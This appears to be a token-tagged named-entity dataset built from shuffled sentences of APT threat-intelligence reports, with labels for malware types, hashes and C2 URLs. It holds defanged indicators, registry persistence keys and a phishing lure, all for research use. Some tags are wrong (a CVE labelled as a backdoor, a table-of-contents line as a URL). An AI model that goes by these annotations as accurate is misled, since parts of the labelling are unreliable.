each	O
stage	O
will	O
have	O
be	O
uncovered	O
and	O
referenced	O
to	O
the	O
other	O
stages	O
.	O

When	O
we	O
count	O
all	O
systems	O
from	O
2016	O
infected	O
with	O
any	O
one	O
of	O
the	O
StrongPity	O
components	O
or	O
a	O
dropper	O
,	O
we	O
see	O
a	O
more	O
expansive	O
picture	O
.	O

It	O
is	O
not	O
protected	O
by	O
a	O
runtime	O
packer	O
or	O
crypter	O
,	O
it	O
does	O
not	O
have	O
sandbox	O
detection	O
or	O
anti-debugging	O
measures	O
,	O
most	O
character	O
strings	O
are	O
shown	O
in	O
clear-text	O
.	O

9	O
.	O

Instead	O
,	O
the	O
author	O
modified	O
TeamViewer	O
client	O
version	O
5.0.9104	O
.	O

Members	O
of	O
root9B	O
's	O
operations	O
team	O
conducted	O
HUNT	O
operations	O
,	O
remotely	O
deploying	O
their	O
live	O
memory	O
capability	O
across	O
the	O
clients	O
proprietary	O
networks	O
to	O
analyze	O
known	O
techniques	O
that	O
can	O
evade	O
the	O
most	O
efficient	O
security	O
products	O
on	O
the	O
market	O
.	O

The	O
author	O
is	O
using	O
routine	O
to	O
detect	O
whether	O
the	O
malware	O
has	O
been	O
executed	O
without	O
a	O
user	O
being	O
present	O
,	O
which	O
is	O
typically	O
done	O
during	O
sandbox	O
analysis	O
.	O

The	O
dynamic/sandbox	O
analysis	O
did	O
not	O
reveal	O
much	O
about	O
the	O
functionality	O
of	O
the	O
malware	O
,	O
in	O
order	O
to	O
understand	O
the	O
capabilities	O
of	O
the	O
malware	O
,	O
the	O
sample	O
had	O
be	O
reverse	O
engineered	O
.	O

Babar	B-malware.drop
operates	O
through	O
multiple	O
instances	O
,	O
by	O
injecting	O
its	O
DLL	O
to	O
a	O
maximum	O
of	O
three	O
desktop	O
processes	O
.	O

This	O
same	O
individual	O
has	O
registered	O
numerous	O
other	O
fake	O
domains	O
on	O
many	O
more	O
name	O
servers	O
.	O

The	O
backdoor	O
may	O
also	O
make	O
requests	O
to	O
the	O
C2	O
over	O
HTTP	O
using	O
the	O
following	O
parameters	O
in	O
the	O
URI	O
string	O
'	O
'	O
and	O
'	O
The	O
PDB	O
path	O
,	O
,	O
was	O
also	O
left	O
in	O
the	O
backdoor	O
although	O
no	O
other	O
instances	O
of	O
this	O
path	O
could	O
be	O
identified	O
.	O

Figure	O
7	O
:	O
Contents	O
of	O
ZIP	O
Archive	O

Trend	O
MicroTM	O
Hosted	O
Email	O
Security	O
is	O
a	O
no-maintenance	O
cloud	O
solution	O
that	O
delivers	O
continuously	O
updated	O
protection	O
to	O
stop	O
spam	O
,	O
malware	O
,	O
spear	O
phishing	O
,	O
ransomware	O
,	O
and	O
advanced	O
targeted	O
attacks	O
before	O
they	O
reach	O
the	O
network	O
.	O

In	O
addition	O
,	O
they	O
developed	O
a	O
novel	O
and	O
stealthy	O
backdoor	O
that	O
targets	O
Microsoft	O
Outlook	O
for	O
command-and-control	O
channel	O
and	O
data	O
exfiltration	O
.	O

A	O
new	O
row	O
is	O
then	O
added	O
to	O
the	O
Connections	O
tab	O
grid	O
of	O
the	O
client	O
interface	O
and	O
the	O
details	O
of	O
the	O
server	O
host	O
are	O
populated	O
in	O
the	O
appropriate	O
fi	O
elds	O
.	O

This	O
is	O
in	O
accordance	O
with	O
the	O
victimology	O
described	O
by	O
Canada	O
's	O
CSE	O
in	O
its	O
presentation	O
:	O
That	O
leads	O
us	O
to	O
the	O
final	O
point	O
of	O
this	O
blog	O
:	O
several	O
signs	O
suggest	O
that	O
Dino	B-malware.backdoor
's	O
creators	O
are	O
French	O
speaking	O
developers	O
.	O

Figures	O
1	O
and	O
2	O
below	O
show	O
the	O
modified	O
weaponized	O
PDF	O
,	O
which	O
was	O
used	O
in	O
the	O
spear	O
phishing	O
attack	O
.	O

https://plus.google.com/u/1/115033746922297164649	B-url.normal

A	O
remedy	O
for	O
this	O
issue	O
will	O
be	O
provided	O
upon	O
release	O
of	O
an	O
official	O
vendor	O
patch	O
.	O

The	O
Bankshot	O
implant	O
is	O
attached	O
to	O
a	O
malicious	O
Word	O
document	O
with	O
the	O
filename	O
Agreement.docx	O
.	O

The	O
decryption	O
goes	O
through	O
several	O
phases	O
.	O

APT28	B-malware.infosteal
has	O
also	O
compromised	O
and	O
placed	O
malware	O
on	O
legitimate	O
websites	O
intending	O
to	O
infect	O
site	O
visitors	O
,	O
and	O
has	O
gained	O
access	O
to	O
organizations	O
by	O
compromising	O
their	O
web-facing	O
servers	O
INFECTION	O
WITH	O
MALWARE	O
VIA	O
SPEAR	O
PHISH	O
WEBMAIL	O
ACCESS	O
VIA	O
SPEAR-PHISH	O

Shamoon	B-malware.unknown
operation	O
results	O
in	O
much	O
of	O
the	O
data	O
on	O
the	O
affected	O
systems	O
being	O
overwritten	O
with	O
the	O
fragmented	O
image	O
of	O
a	O
burning	O
flag	O
.	O

We	O
'd	O
like	O
to	O
think	O
of	O
this	O
ongoing	O
research	O
as	O
an	O
opportunity	O
for	O
an	O
open	O
invitation	O
to	O
the	O
larger	O
security	O
community	O
to	O
help	O
nail	O
down	O
(	O
or	O
disprove	O
)	O
the	O
link	O
between	O
BlackEnergy	O
and	O
ExPetr/Petya	O
.	O

-	O
דגא	O
תומייקו	O
תידיגאת	O
תוירחא	O
חוד	O

He	O
created	O
Armitage	O
for	O
Metasploit	O
,	O
the	O
Sleep	O
programming	O
language	O
,	O
and	O
the	O
IRC	O
client	O
jIRCii	O
.	O

The	O
code	O
that	O
performs	O
this	O
operation	O
is	O
shown	O
in	O
Figure	O
5	O
.	O

In	O
August	O
,	O
the	O
Guccifer	O
2.0	O
persona	O
contacted	O
reporters	O
covering	O
U.S.	O
House	O
of	O
Representative	O
races	O
to	O
announce	O
newly	O
leaked	O
documents	O
from	O
the	O
DCCC	O
pertaining	O
to	O
Democratic	O
candidates	O
.	O

Sample	O
(	O
SHA256	O
:	O
1eda7e556181e46ba6e36f1a6bfe18ff5566f9d5e51c53b41d08f9459342e26c	B-hash
)	O
is	O
configured	O
to	O
act	O
as	O
a	O
server	O
.	O

Our	O
technical	O
analysis	O
shows	O
the	O
group	O
has	O
remained	O
active	O
.	O

46e55cdf507ef10b	B-hash
11d74dad6af8b94e	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
MSSoap.DLL	O
989d04ab23385260	B-hash
a402ce7b6751e60e	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
MSSoap.DLL	O
6de67d5bfe61fbdc	B-hash
2febfd289e9660c3	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
MSSoap.DLL	O
http.jpaols[.]facebook.pktmedia[.]com	B-url.cncsvr
facebook.skyppee[.]com	B-url.cncsvr
http.jpaols[.]hc_NewCT	B-url.cncsvr
face_NewCT	O
jp80_NewCT	O
908d847fd39a2851	B-hash
85b3f0e8dc874dad	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
MSSoap.DLL	O
sslc.moafee[.]sslc_NewCT	B-url.cncsvr
26a48ee15b8f976d	B-hash
b35e219428e05ef3	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
MSSoap.DLL	O
http.jpaols[.]jp80_NewCT	B-url.cncsvr
bd5ed9168632e6da	B-hash
a6bcee6b6c48d60f	I-hash
NewCT2	B-malware.backdoor
81998ee8b8f8304d	B-hash
038e3cb5ff10b4d2	I-hash
BurnDCSrv	O
.	O

We	O
have	O
seen	O
RTF	O
and	O
XLS	O
files	O
used	O
for	O
delivery	O
.	O

If	O
macros	O
are	O
disabled	O
,	O
users	O
are	O
presented	O
with	O
a	O
dialog	O
box	O
(	O
below	O
)	O
prompting	O
them	O
to	O
enable	O
macros	O
.	O

Current	O
position	O
:	O
Strategic	O
Cyber	O
LLC	O
,	O
Delaware	O
Air	O
National	O
Guard	O

As	O
a	O
result	O
,	O
it	O
only	O
effectively	O
uses	O
the	O
first	O
half	O
of	O
the	O
key	O
.	O

Targeted	O
sectors	O
are	O
mostly	O
governmental	O
and	O
diplomatic	O
institutions	O
including	O
embassies	O
;	O
companies	O
from	O
the	O
aerospace	O
and	O
defense	O
Industries	O
;	O
financial	O
institutions	O
;	O
journalists	O
;	O
software	O
developers	O
.	O

John	O
Podesta	O

It	O
also	O
registers	O
itself	O
as	O
a	O
system	O
service	O
by	O
adding	O
the	O
following	O
registry	O
keys	O
:	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wsfbpy	O
sahblabg	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Maobeu	O
xqiyes	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy	O
sahblabg	O
ReleiceName	O
=	O
'	O
Oracle.exe	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy	O
sahblabg	O
ReleiceName	O
=	O
'	O
Maobeu	O
xqiyes	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu	O
xqiyes	O
ConnectGroup	O
=	O
'	O
'	O
'	O
'	O
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu	O
xqiyes	O
MarkTime	O
=	O
'	O
2017-10-19	O
17:21	O
'	O
These	O
steps	O
that	O
the	O
dropper	O
follows	O
to	O
install	O
the	O
RAT	B-malware.backdoor
server	O
are	O
contained	O
within	O
a	O
try-except	O
block	O
,	O
which	O
makes	O
any	O
potential	O
error	O
terminate	O
the	O
execution	O
of	O
the	O
application	O
.	O

The	O
SQL	O
statements	O
are	O
dropped	O
into	O
a	O
temporary	O
file	O
with	O
the	O
'	O
SQL	O
'	O
prefix	O
.	O

Type	O
indicator	O
AV	O
detection	O

Filename	O
:	O
2018	O
年度	O
(	O
平成	O
30	O
年度	O
)	O
税制改正について	O
.doc	O

One	O
of	O
the	O
most	O
interesting	O
pieces	O
of	O
information	O
about	O
the	O
MDM	B-malware.infosteal
is	O
found	O
in	O
the	O
log	O
file	O
.	O

Figure	O
9	O
.	O

.	O

The	O
big	O
blue	O
recommended	O
button	O
(	O
here	O
in	O
French	O
)	O
linked	O
to	O
the	O
malicious	O
installer	O
,	O
while	O
all	O
the	O
other	O
links	O
on	O
the	O
page	O
directed	O
to	O
legitimate	O
software	O
:	O

If	O
it	O
does	O
not	O
find	O
the	O
string	O
'	O
Connection	O
!	O
'	O

Open	O
directories	O
were	O
often	O
left	O
on	O
delivery	O
servers	O
.	O

Sending	O
of	O
machine	O
information	O
to	O
the	O
C	O
&	O
C	O
It	O
took	O
a	O
while	O
before	O
we	O
were	O
able	O
to	O
receive	O
commands	O
from	O
the	O
C	O
&	O
C	O
,	O
and	O
when	O
we	O
did	O
we	O
suddenly	O
lost	O
connection	O
to	O
the	O
C	O
&	O
C	O
,	O
which	O
could	O
mean	O
that	O
the	O
hacker	O
controls	O
the	O
C	O
&	O
C	O
manually	O
.	O

The	O
group	O
hit	O
organizations	O
in	O
Israel	O
,	O
Jordan	O
,	O
the	O
United	O
Arab	O
Emirates	O
,	O
Saudi	O
Arabia	O
,	O
and	O
Turkey	O
.	O

Each	O
of	O
the	O
two	O
groups	O
also	O
had	O
a	O
unique	O
theme	O
to	O
their	O
target	O
sets	O
.	O

Also	O
for	O
this	O
intrusion	O
we	O
ca	O
n't	O
know	O
the	O
identity	O
of	O
the	O
target	O
,	O
but	O
our	O
hypothesis	O
is	O
either	O
someone	O
in	O
the	O
telecommunications	O
industry	O
or	O
a	O
representative	O
of	O
the	O
local	O
government	O
.	O

We	O
searched	O
for	O
information	O
about	O
the	O
targets	O
in	O
order	O
to	O
learn	O
the	O
interests	O
of	O
the	O
attackers	O
.	O

The	O
attackers	O
originally	O
embedded	O
an	O
implant	O
into	O
the	O
malicious	O
document	O
as	O
a	O
hypertext	O
application	O
(	O
HTA	O
)	O
 le	O
,	O
and	O
then	O
quickly	O
moved	O
to	O
hide	O
it	O
in	O
an	O
image	O
on	O
a	O
remote	O
server	O
and	O
used	O
obfuscated	O
Visual	O
Basic	O
macros	O
to	O
launch	O
the	O
decoder	O
script	O
.	O

Uranio7	O
Uranio7	O
Uranio7	O

a	O
.	O

A	O
senior	O
official	O
at	O
the	O
Birzeit	O
University	O
in	O
the	O
Palestinian	O
Authority	O
.	O

Since	O
at	O
least	O
2007	O
,	O
APT28	B-malware.infosteal
has	O
engaged	O
in	O
extensive	O
operations	O
in	O
support	O
of	O
Russian	O
strategic	O
interests	O
.	O

Please	O
urgently	O
confirm	O
the	O
attached	O
transactions	O
for	O
compliance	O
,	O
sign	O
and	O
send	O
a	O
copy	O
to	O
info@compliance.com	O
and	O
must	O
come	O
from	O
farralescb@alrajhibank.com.sa	O
Monetary	O
Compliance	O

'Important.exe	O
'	O
,	O
In	O
addition	O
to	O
that	O
it	O
also	O
drops	O
two	O
files	O
'	O
Mails.txt	O
'	O
and	O
'	O
Browsers.txt	O
'	O
into	O
the	O
same	O
directory	O
as	O
shown	O
below	O
.	O

hXXp://www.azhar.bf/modules/mod_search/found/cache/postal.php	B-url.cncsvr
hXXp://www.rsvniima.org/templates/rsv/icons/din12/postal.php	B-url.cncsvr
hXXp://dneprorudnoe.info/sxd/lang/i18n/charcodes/postal.php	B-url.cncsvr
C	O
:	O
\Program	O
Files\Common	O
Files\wusvcd\wusvcd.exe	O
C	O
:	O
\Program	O
Files\Common	O
Files\wusvcd\wusvcd00000000­0000­	O
0000­0000­0000­00000000	O
.	O

In	O
addition	O
to	O
its	O
main	O
communication	O
method	O
,	O
CozyDuke	B-malware.drop
also	O
features	O
the	O
ability	O
to	O
use	O
Twitter	O
as	O
a	O
backup	O
C	O
&	O
C	O
channel	O
.	O

2016	O
.	O

80	O
34	O
0B	O
D8	O
80	O
34	O
0B	O
D8	O
Kernel32.dll	O
searching	O
code	O
.	O

In	O
the	O
given	O
case	O
this	O
applies	O
to	O
all	O
32-bit	O
processes	O
.	O

Firstly	O
,	O
CozyDuke	B-malware.drop
may	O
set	O
itself	O
to	O
be	O
executed	O
at	O
system	O
startup	O
by	O
adding	O
a	O
registry	O
value	O
under	O
any	O
of	O
the	O
following	O
registry	O
keys	O
:	O
•	O
HKLM\Software\Microsoft\Windows\	O
CurrentVersion\Run\	O
•	O
HKCU\Software\Microsoft\Windows\	O
CurrentVersion\Run\	O
•	O
HKLM\Software\Microsoft\Windows\	O
CurrentVersion\Policies\Explorer\Run	O
•	O
HKCU\Software\Microsoft\Windows\	O
CurrentVersion\Policies\Explorer\Run	O
The	O
name	O
of	O
the	O
registry	O
value	O
will	O
usually	O
be	O
the	O
filename	O
,	O
(	O
without	O
the	O
extension	O
)	O
of	O
the	O
CozyDuke	B-malware.drop
main	O
component	O
.	O

JRat	B-malware.backdoor
is	O
a	O
cross	O
platform	O
RAT	O
,	O
able	O
to	O
target	O
hosts	O
running	O
Windows	O
,	O
OSX	O
,	O
Linux	O
,	O
BSD	O
,	O
and	O
even	O
Solaris	O
.	O

This	O
erratic	O
composition	O
make	O
the	O
Lazarus	O
intrusion	O
malware	O
difficult	O
to	O
identify	O
and	O
group	O
or	O
cluster	O
,	O
unless	O
they	O
are	O
analyzed	O
at	O
the	O
level	O
of	O
code	O
similarity	O
.	O

It	O
appears	O
that	O
this	O
version	O
was	O
only	O
used	O
in	O
early	O
campaigns	O
,	O
as	O
the	O
latest	O
referenced	O
backdoor	O
version	O
Cylance	O
identified	O
was	O
'	O
v1.2.2	O
.	O
'	O

If	O
the	O
Trojan	B-malware.backdoor
finds	O
processes	O
whose	O
hash	O
matches	O
the	O
three	O
values	O
mentioned	O
earlier	O
,	O
it	O
sets	O
a	O
boolean	O
value	O
(	O
the	O
character	O
'	O
1	O
'	O
)	O
within	O
the	O
data	O
sent	O
to	O
the	O
C2	O
server	O
and	O
continues	O
carrying	O
out	O
its	O
functionality	O
.	O

On	O
December	O
29	O
,	O
2016	O
,	O
the	O
Department	O
of	O
Homeland	O
Security	O
(	O
DHS	O
)	O
and	O
Federal	O
Bureau	O
of	O
Investigation	O
(	O
FBI	O
)	O
released	O
a	O
Joint	O
Analysis	O
Report	O
confirming	O
FireEye	O
's	O
long	O
held	O
public	O
assessment	O
that	O
the	O
Russian	O
Government	O
sponsors	O
APT28	B-malware.infosteal
.	O

ScarCruft	B-malware.infosteal
is	O
a	O
relatively	O
new	O
APT	O
group	O
;	O
victims	O
have	O
been	O
observed	O
in	O
Russia	O
,	O
Nepal	O
,	O
South	O
Korea	O
,	O
China	O
,	O
India	O
,	O
Kuwait	O
and	O
Romania	O
.	O

7657769f767cd021438fcce96a6befaf3bb2ba2d	B-hash
Ed074a1609616fdb56b40d3059ff4bebe729e436	I-hash
D667701804CA05BB536B80337A33D0714EA28129	I-hash
F45A41D30F9574C41FE0A27CB121A667295268B2	I-hash
7F4C28639355B0B6244EADBC8943E373344B2E7E	I-hash
***Some	O
of	O
the	O
phishing	O
emails	O
and	O
Word	O
documents	O
were	O
very	O
targeted	O
and	O
personalized	O
,	O
therefore	O
,	O
they	O
are	O
not	O
listed	O
here	O
for	O
privacy	O
reasons	O

%	O
TEMP	O
%	O
\Center1	O
[	O
Decimal_Result_of_GetTickCount	O
]	O
.dat	O
%	O
TEMP	O
%	O
\Center	O
[	O
Decimal_Result_of_GetTickCount	O
]	O
.dat	O
%	O
AppData%\adobe\adobe.dat	O

The	O
code	O
then	O
tries	O
to	O
kill	O
each	O
process	O
and	O
service	O
that	O
belongs	O
to	O
the	O
following	O
list	O
of	O
AV	O
products	O
:	O
Symantec	O
Firewall	O
Norton	O
ESET	O
McAfee	O
Avast	O
Avira	O
Sophos	O
Malwarebytes	O
Next	O
,	O
the	O
ZxShell	B-malware.backdoor
Load-Image	O
Notify	O
function	O
prevents	O
the	O
AV	O
processes	O
from	O
restarting	O
.	O

Checks	O
to	O
see	O
if	O
WireShark	O
is	O
running	O
.	O

17	O
June	O
2014	O
.	O

The	O
decryption	O
loop	O
performs	O
the	O
following	O
two	O
steps	O
:	O
First	O
,	O
it	O
performs	O
an	O
additional	O
scrambling	O
operation	O
on	O
the	O
substitution	O
table	O
stable_var_41C	O
by	O
swapping	O
two	O
elements	O
.	O

The	O
loader	O
appears	O
to	O
be	O
different	O
every	O
time	O
and	O
internal	O
strings	O
indicate	O
it	O
is	O
'	O
polymorphically	O
'	O
generated	O
.	O

i.e.	O
445	O
is	O
required	O
for	O
SCOM	O
to	O
push	O
an	O
agent	O
install	O
,	O
therefore	O
445	O
should	O
only	O
be	O
allowed	O
from	O
that	O
source	O
server	O
;	O
8/10	O
•	O
Application	O
blacklisting	O
should	O
be	O
implemented	O
to	O
prevent	O
the	O
use	O
of	O
tools	O
such	O
as	O
vssadmin.exe	O
,	O
cmd.exe	O
,	O

This	O
malicious	O
software	O
,	O
which	O
could	O
have	O
been	O
active	O
since	O
late	O
2016	O
,	O
was	O
used	O
in	O
a	O
recent	O
campaign	O
targeting	O
financial	O
institutions	O
using	O
watering	O
hole	O
attacks	O
.	O

But	O
any	O
string	O
,	O
from	O
strong	O
passwords	O
to	O
bank	O
account	O
numbers	O
and	O
more	O
could	O
be	O
affected	O
.	O

>	O
100,000	O
8	O
billion	O
>	O
1	O
year	O

We	O
monitored	O
this	O
server	O
for	O
two	O
months	O
,	O
from	O
January	O
to	O
March	O
this	O
year	O
.	O

Operation	O
Cobalt	O
Kitty	O
is	O
unique	O
in	O
many	O
ways	O
,	O
nonetheless	O
,	O
it	O
is	O
still	O
just	O
one	O
link	O
in	O
the	O
group	O
's	O
evergrowing	O
chain	O
of	O
APT	O
campaigns	O
.	O

The	O
executable	O
is	O
written	O
in	O
.NET	O
framework	O
The	O
content	O
stored	O
in	O
the	O
TexBox	O
within	O
the	O
UserForm	O
is	O
an	O
executable	O
content	O
in	O
the	O
decimal	O
format	O
.	O

http://<webserver>/showimage.asp*=%52%65%73%70%6F%6E%73%65%2E%57%72%69%74%65%28%22%3C%68%31%3E%48%65%6C%6C%6F%20%57%6F%72%6C%64%3C%2F%68%31%3E%22%	B-url.unknown
29	I-url.unknown

Comparisons	O
with	O
cipher	O
design	O
and	O
implementations	O
we	O
see	O
in	O
WhiteBear	O
,	O
earlier	O
SPLM	B-malware.backdoor
and	O
Zebrocy	O
modules	O
tell	O
a	O
few	O
things	O
about	O
design	O
decisions	O
and	O
culture	O
.	O

To	O
date	O
these	O
have	O
included	O
the	O
conflict	O
in	O
Syria	O
,	O
NATO-Ukraine	O
relations	O
,	O
the	O
European	O
Union	O
refugee	O
and	O
migrant	O
crisis	O
,	O
the	O
2016	O
Olympics	O
and	O
Paralympics	O
Russian	O
athlete	O
doping	O
scandal	O
,	O
public	O
accusations	O
regarding	O
Russian	O
state-sponsored	O
hacking	O
,	O
and	O
the	O
2016	O
U.S.	O
presidential	O
election	O
.	O

The	O
purpose	O
is	O
to	O
copy	O
the	O
active	O
document	O
(	O
the	O
opened	O
Word	O
document	O
)	O
in	O
a	O
temporary	O
directory	O
and	O
to	O
rename	O
it	O
as	O
a	O
ZIP	O
archive	O
.	O

A	O
good	O
example	O
of	O
such	O
an	O
installer	O
is	O
the	O
repackaged	O
Firefox	O
installer	O
described	O
by	O
360	O
Labs	O
on	O
Freebuf	O
(	O
Chinese	O
language	O
)	O
.	O

While	O
all	O
payloads	O
can	O
be	O
dynamically	O
updated	O
,	O
at	O
the	O
time	O
of	O
delivery	O
,	O
this	O
task	O
launched	O
a	O
COM	O
scriptlet	O
(	O
'	O
.sct	O
'	O
file	O
extension	O
)	O
that	O
downloaded	O
and	O
executed	O
Meterpreter	O
hosted	O
on	O
images.chinabytes[.]info	O
.	O

With	O
the	O
release	O
of	O
MS10-002	O
,	O
and	O
the	O
subsequent	O
integration	O
with	O
Metasploit	O
,	O
the	O
exploit	O
vector	O
used	O
with	O
Aurora	B-malware.infosteal
has	O
been	O
adopted	O
laterally	O
within	O
the	O
malware	O
development	O
economy	O
.	O

The	O
Vietnamese	O
and	O
Ethiopian	O
FinSpy	B-malware.backdoor
samples	O
we	O
identified	O
warrant	O
further	O
investigation	O
,	O
especially	O
given	O
the	O
poor	O
human	O
rights	O
records	O
of	O
these	O
countries	O
.	O

The	O
fourth	O
technique	O
checks	O
the	O
Processor	O
ID	O
of	O
the	O
system	O
.	O

Stuxnet	O
and	O
scientist	O
assassinations	O
reminded	O
Iran	O
of	O
the	O
efficacy	O
of	O
Mossad	O
and	O
CIA	O
programs	O
,	O
and	O
according	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
fervent	O
religious	O
ideology	O
was	O
the	O
only	O
way	O
to	O
demonstrate	O
loyalty	O
and	O
build	O
trust	O
.	O

This	O
,	O
however	O
,	O
is	O
a	O
known	O
tactic	O
that	O
a	O
lot	O
of	O
(	O
similar	O
to	O
the	O
CAPTCHA	O
we	O
often	O
see	O
on	O
the	O
internet	O
)	O
.	O

Recently	O
,	O
a	O
new	O
series	O
of	O
malware	O
samples	O
were	O
submitted	O
to	O
the	O
major	O
online	O
sandboxes	O
.	O

Based	O
on	O
our	O
analysis	O
of	O
the	O
email	O
header	O
,	O
this	O
message	O
did	O
not	O
come	O
from	O
NCTC	O
,	O
rather	O
from	O
the	O
attacker	O
's	O
IP	O
address	O
in	O
Singapore	O
.	O

The	O
modules	O
saves	O
them	O
to	O
a	O
file	O
that	O
will	O
be	O
sent	O
to	O
the	O
C	O
&	O
C	O
servers	O
.	O

Cloud	B-malware.unknown
Atlas	I-malware.unknown
exploit	O
payload	O
-	O
VBScript	B-malware.unknown

At	O
location	O
1.	O
is	O
a	O
dropper	O
obtained	O
from	O
an	O
exploit	O
server	O
directly	O
accessed	O
from	O
the	O
extracted	O
shellcode	O
from	O
a	O
MS10-002	O
JavaScript	O
vector	O
.	O

Shutdown	O
the	O
server	O
variant	O
(	O
set	O
fShutdown	O
to	O
true	O
)	O
Drop	O
a	O
new	O
DLL	O
to	O
%	O
TEMP%\tmp1.dat	O
,	O
load	O
the	O
DLL	O
into	O
memory	O
and	O
call	O
DllRegisterServer	O
to	O
install	O
a	O
new	O
server	O
variant	O
binary	O
on	O
the	O
victim	O
's	O
system	O
.	O

Ars	O
Technica	O
.	O

World	O
Anti-Doping	O
Agency	O
.	O

To	O
make	O
execution	O
of	O
payload	O
invisible	O
for	O
these	O
defense	O
systems	O
,	O
the	O
threat	O
actors	O
used	O
the	O
Windows	O
DDE	O
interface	O
in	O
a	O
very	O
clever	O
way	O
.	O

When	O
looking	O
for	O
a	O
file	O
in	O
ramFS	O
,	O
each	O
chunk	O
is	O
decrypted	O
,	O
processed	O
and	O
then	O
re­encrypted	O
.	O

Using	O
both	O
of	O
these	O
tools	O
together	O
,	O
a	O
sort	O
of	O
one	O
off	O
,	O
poor	O
man	O
's	O
end-to-end	O
encryption	O
can	O
be	O
maintained	O
for	O
free	O
by	O
putting	O
these	O
two	O
solutions	O
together	O
with	O
free	O
file	O
sharing	O
services	O
.	O

The	O
malicious	O
DLL	O
is	O
not	O
a	O
service	O
DLL	O
because	O
it	O
lacks	O
ServiceMain	O
(	O
)	O
.	O

Also	O
,	O
bizarrely	O
the	O
attackers	O
check	O
the	O
path	O
'	O
Program	O
Files	O
(	O
x80236	O
)	O
'	O
–	O
if	O
anyone	O
knows	O
what	O
this	O
corresponds	O
to	O
,	O
please	O
get	O
in	O
touch	O
and	O
let	O
us	O
know	O
.	O

EvilGrab	B-malware.drop
stores	O
its	O
components	O
in	O
the	O
following	O
registry	O
entries	O
:	O

A	O
list	O
of	O
decrypted	O
API	O
strings	O
and	O
the	O
python	O
code	O
can	O
be	O
found	O
in	O
the	O
Appendix	O
and	O
Minerva	O
Labs	O
Research	O
GitHub	O
repository	O
.	O

RESOURCES	O
....................................................................................................	B-url.normal
18	I-url.normal
6	O
.	O

SA	O

Avast	O
managed	O
to	O
identify	O
the	O
vulnerability	O
exploited	O
as	O
CVE-2012-1889	B-malware.backdoor
which	O
allows	O
remote	O
attackers	O
to	O
execute	O
arbitrary	O
code	O
or	O
cause	O
a	O
denial	O
of	O
service	O
via	O
a	O
crafted	O
website	O
.	O

Here	O
are	O
the	O
two	O
'	O
master	O
'	O
email	O
addresses	O
to	O
which	O
the	O
bots	O
send	O
e-mails	O
on	O
behalf	O
of	O
the	O
abovementioned	O
accounts	O
.	O

Trend	O
Micro	O
Incorporated	O
,	O
a	O
global	O
leader	O
in	O
security	O
software	O
,	O
strives	O
to	O
make	O
the	O
world	O
safe	O
for	O
exchanging	O
digital	O
information	O
.	O

A	O
variable-sized	O
packet	O
that	O
contains	O
the	O
packet	O
payload	O
AES	O
encrypted	O
.	O

CFNetwork/673.3	O
Darwin/13.4.0	O
(	O
x86_64	O
)	O
Accept-Language	O
:	O
en	O
-us	O
Accept-Encoding	O
:	O
gzip	O
,	O
deflate	O
Connection	O
:	O
keep	O
-alive	O

Kazakhstan	O
to	O
request	O
an	O
injunction	O
in	O
a	O
New	O
York	O
court	O
to	O
bar	O
the	O
website	O
from	O
publishing	O
the	O
'	O
stolen	O
'	O
emails	O
.	O

Figure	O
19	O
:	O
Extensive	O
list	O
of	O
process	O
names	O

Furthermore	O
,	O
'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
is	O
advertised	O
as	O
'	O
a	O
new	O
,	O
revolutionary	O
botnet	B-malware.ransom
[	O
...	O
]	O
and	O
very	O
noob-friendly	O
'	O
.	O

The	O
email	O
,	O
allegedly	O
sent	O
by	O
the	O
'	O
Israeli	O
Defense	O
Force	O
cyber	O
team	O
'	O
,	O
asked	O
for	O
undisclosed	O
information	O
we	O
had	O
about	O
the	O
culprit	O
behind	O
DustySky	B-malware.drop
(	O
the	O
email	O
referred	O
to	O
a	O
statement	O
in	O
the	O
first	O
report	O
in	O
which	O
we	O
wrote	O
that	O
'	O
we	O
have	O
decided	O
not	O
to	O
disclose	O
this	O
individual	O
's	O
name	O
in	O
the	O
public	O
report	O
'	O
)	O
.	O

Second	O
step	O
,	O
decrypt	O
the	O
obfuscated	O
command	O
.	O

The	O
library	O
retrieves	O
its	O
resource	O
and	O
tries	O
to	O
start	O
the	O
service	O
'	O
DeviceAssociationService	O
'	O
.	O

7a02a835016bc630aa9e20bc4bc0967715459daa	B-hash

Home	O
'	O
Targeted	O
Attacks	O
'	O
Another	O
Potential	O
MuddyWater	O
Campaign	O
uses	O
Powershell-based	O
PRB-Backdoor	O
June	O
14	O
,	O
2018	O
at	O
5:00	O
am	O
Targeted	O
Attacks	O
Trend	O
Micro	O

This	O
time	O
the	O
email	O
was	O
made	O
to	O
look	O
like	O
an	O
investigation	O
report	O
related	O
to	O
Jammu	O
&	O
Kashmir	O
protest	O
was	O
shared	O
by	O
the	O
Ministry	O
of	O
Home	O
Affairs	O
Official	O
and	O
the	O
forwarded	O
email	O
was	O
made	O
to	O
look	O
like	O
the	O
report	O
was	O
forwarded	O
by	O
an	O
Ambassador	O
in	O
Thailand	O
Indian	O
embassy	O
to	O
the	O
MEA	O
officials	O
.	O

This	O
ransomware	O
is	O
detected	O
by	O
ESET	O
products	O
as	O
Python/Filecoder.R	O
and	O
,	O
predictably	O
,	O
it	O
is	O
written	O
in	O
the	O
Python	O
programming	O
language	O
.	O

The	O
loaded	O
Shellcode	O
script	O
can	O
be	O
used	O
to	O
call	O
command	O
line	O
to	O
add	O
a	O
certain	O
field	O
of	O
encrypted	O
date	O
into	O
memory	O
and	O
run	O
it	O
.	O

IDTYPE	O

Figure	O
3	O
.	O

We	O
want	O
to	O
thank	O
our	O
